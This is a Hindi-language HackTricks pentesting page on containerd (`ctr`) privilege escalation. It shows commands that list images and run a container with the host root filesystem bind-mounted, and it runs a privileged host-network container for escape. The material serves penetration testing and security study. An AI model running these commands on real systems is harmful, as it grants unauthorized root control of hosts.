# कंटेनरडी (ctr) प्रिविलेज एस्कलेशन

<details>

<summary><strong>जानें AWS हैकिंग को शून्य से हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप अपनी **कंपनी का विज्ञापन HackTricks में देखना चाहते हैं** या **HackTricks को PDF में डाउनलोड करना चाहते हैं** तो [**सब्सक्रिप्शन प्लान्स देखें**](https://github.com/sponsors/carlospolop)!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें
* हमारे विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह [**The PEASS Family**](https://opensea.io/collection/the-peass-family) खोजें
* **शामिल हों** 💬 [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या हमें **ट्विटर** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)** पर फॉलो** करें।
* **हैकिंग ट्रिक्स साझा करें और PRs सबमिट करके** [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos में।

</details>

## मूल जानकारी

**कंटेनरडी** और `ctr` क्या है इसे जानने के लिए निम्न लिंक पर जाएं:

{% content-ref url="../../network-services-pentesting/2375-pentesting-docker.md" %}
[2375-pentesting-docker.md](../../network-services-pentesting/2375-pentesting-docker.md)
{% endcontent-ref %}

## PE 1

अगर आपको लगता है कि किसी होस्ट में `ctr` कमांड है:
```bash
which ctr
/usr/bin/ctr
```
आप छवियों की सूची बना सकते हैं:
```bash
ctr image list
REF                                  TYPE                                                 DIGEST                                                                  SIZE      PLATFORMS   LABELS
registry:5000/alpine:latest application/vnd.docker.distribution.manifest.v2+json sha256:0565dfc4f13e1df6a2ba35e8ad549b7cb8ce6bccbc472ba69e3fe9326f186fe2 100.1 MiB linux/amd64 -
registry:5000/ubuntu:latest application/vnd.docker.distribution.manifest.v2+json sha256:ea80198bccd78360e4a36eb43f386134b837455dc5ad03236d97133f3ed3571a 302.8 MiB linux/amd64 -
```
और फिर **उन छवियों में से एक को चलाएं जिसमें मेज़बान रूट फ़ोल्डर को माउंट करें**:
```bash
ctr run --mount type=bind,src=/,dst=/,options=rbind -t registry:5000/ubuntu:latest ubuntu bash
```
## PE 2

एक कंटेनर को विशेषाधिकार सहित चलाएं और उससे बाहर निकलें।\
आप इसे विशेषाधिकार सहित एक कंटेनर के रूप में चला सकते हैं:
```bash
ctr run --privileged --net-host -t registry:5000/modified-ubuntu:latest ubuntu bash
```
तो आप इससे बाहर निकलने के लिए कुछ तकनीकों का उपयोग कर सकते हैं जो निम्नलिखित पृष्ठ में उल्लेखित किए गए हैं **विशेषाधिकारित क्षमताओं का दुरुपयोग करना**:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}
